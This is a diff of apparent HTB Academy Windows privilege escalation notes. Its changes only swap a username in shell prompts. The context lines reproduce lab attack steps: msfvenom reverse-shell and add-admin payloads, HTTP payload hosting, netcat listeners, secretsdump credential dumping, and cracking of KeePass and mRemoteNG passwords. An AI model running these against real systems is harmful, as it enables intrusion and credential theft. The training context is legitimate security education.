@@ -204,7 +204,7 @@ We can connect via command line using the command `xfreerdp /v:<target ip> /u:ht
 &#x20; Introduction to Windows Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student
+root@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student
 
 [21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
 [21:17:27:323] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
@@ -2416,7 +2416,7 @@ We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file
 &#x20; Windows Built-in Groups
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+root@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 
 Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
 
@@ -2586,7 +2586,7 @@ We can generate a malicious DLL to add a user to the `domain admins` group using
 &#x20; DnsAdmins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+root@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -2603,7 +2603,7 @@ Next, start a Python HTTP server.
 &#x20; DnsAdmins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -m http.server 7777
+root@htb[/htb]$ python3 -m http.server 7777
 
 Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
@@ -3357,7 +3357,7 @@ From here, we have full control over the Domain Controller and could retrieve al
 &#x20; Server Operators
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+root@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
 
 SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
@@ -3368,7 +3368,7 @@ SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\serv
 &#x20; Server Operators
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+root@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
 
 Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
 
@@ -4192,7 +4192,7 @@ These copies can then be transferred back to the attack host, where impacket-sec
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
+root@htb[/htb]$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
 
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 
@@ -4417,7 +4417,7 @@ Let's generate a malicious `maintenanceservice.exe` binary that can be used to o
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -4433,7 +4433,7 @@ We can download it to the target using cURL after starting a Python HTTP server 
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ $ python3 -m http.server 8080
+root@htb[/htb]$ $ python3 -m http.server 8080
 
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.129.43.13 - - [01/Mar/2022 18:17:26] "GET /maintenanceservice.exe HTTP/1.1" 200 -
@@ -4521,7 +4521,7 @@ Launch Metasploit using the Resource Script file to preload our settings.
 &#x20; Kernel Exploits
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfconsole -r handler.rc 
+root@htb[/htb]$ sudo msfconsole -r handler.rc 
                                                  
 
          .                                         .
@@ -4752,7 +4752,7 @@ Next, start a Python web server in the same directory where our `script.ps1` scr
 &#x20; Vulnerable Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -m http.server 8080
+root@htb[/htb]$ python3 -m http.server 8080
 ```
 
 **Catching a SYSTEM Shell**
@@ -4762,7 +4762,7 @@ Finally, start a `Netcat` listener on the attack box and execute the PoC PowerSh
 &#x20; Vulnerable Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 9443
+root@htb[/htb]$ nc -lvnp 9443
 
 listening on [any] 9443 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
@@ -5473,7 +5473,7 @@ We can also copy them over to our attack box and search through the data using t
 &#x20; Other Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$  strings plum.sqlite-wal
+root@htb[/htb]$  strings plum.sqlite-wal
 
 CREATE TABLE "Note" (
 "Text" varchar ,
@@ -5634,7 +5634,7 @@ First, we extract the hash in Hashcat format using the `keepass2john.py` script.
 &#x20; Further Credential Theft
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
+root@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
 
 ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
 ```
@@ -5646,7 +5646,7 @@ We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net
 &#x20; Further Credential Theft
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
+root@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -6615,7 +6615,7 @@ As mentioned previously, if the user didn't set a custom master password, we can
 &#x20; Pillaging
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
+root@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
 
 Password: ASDki230kasd09fk233aDA
 ```
@@ -6642,7 +6642,7 @@ If we attempt to decrypt the `Password` attribute from the node `RDP_Domain`, we
 &#x20; Pillaging
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
+root@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
 
 Traceback (most recent call last):
   File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
@@ -6663,7 +6663,7 @@ If we use the custom password, we can decrypt it.
 &#x20; Pillaging
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
+root@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
 
 Password: ASDki230kasd09fk233aDA
 ```
@@ -6675,7 +6675,7 @@ In case we want to attempt to crack the password, we can modify the script to tr
 &#x20; Pillaging
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
+root@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                               
 Spring2017
 Spring2016
@@ -6722,7 +6722,7 @@ We can copy the file to our machine and use the Python script [cookieextractor.p
 &#x20; Pillaging
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+root@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
 
 (201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
 ```
@@ -7124,7 +7124,7 @@ Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the pol
 We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+root@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -7146,7 +7146,7 @@ C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
 If all goes to plan, we will receive a connection back as `NT AUTHORITY\SYSTEM`.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lnvp 9443
+root@htb[/htb]$ nc -lnvp 9443
 
 listening on [any] 9443 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
@@ -7357,13 +7357,13 @@ If we encounter any of these three files, we have options to mount them on eithe
 **Mount VMDK on Linux**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
+root@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
 ```
 
 **Mount VHD/VHDX on Linux**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
+root@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
 ```
 
 In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.
@@ -7379,7 +7379,7 @@ Why do we care about a virtual hard drive (especially Windows)? If we can locate
 &#x20; Miscellaneous Techniques
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+root@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 
 Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation
 
@@ -7932,15 +7932,15 @@ This tool works on the Pwnbox, but to get it working on a local version of Parro
 &#x20; Windows Desktop Versions
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
-AbdulrahmanTamim@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz
-AbdulrahmanTamim@htb[/htb]$ cd setuptools-2.0/
-AbdulrahmanTamim@htb[/htb]$ sudo python2.7 setup.py install
+root@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
+root@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz
+root@htb[/htb]$ cd setuptools-2.0/
+root@htb[/htb]$ sudo python2.7 setup.py install
 
-AbdulrahmanTamim@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
-AbdulrahmanTamim@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz
-AbdulrahmanTamim@htb[/htb]$ cd xlrd-1.0.0/
-AbdulrahmanTamim@htb[/htb]$ sudo python2.7 setup.py install
+root@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
+root@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz
+root@htb[/htb]$ cd xlrd-1.0.0/
+root@htb[/htb]$ sudo python2.7 setup.py install
 ```
 
 **Gathering Systeminfo Command Output**
@@ -7982,7 +7982,7 @@ We then need to update our local copy of the Microsoft Vulnerability database. T
 &#x20; Windows Desktop Versions
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python2.7 windows-exploit-suggester.py --update
+root@htb[/htb]$ sudo python2.7 windows-exploit-suggester.py --update
 ```
 
 **Running Windows Exploit Suggester**
@@ -7992,7 +7992,7 @@ Once this is done, we can run the tool against the vulnerability database to che
 &#x20; Windows Desktop Versions
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
+root@htb[/htb]$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
 
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
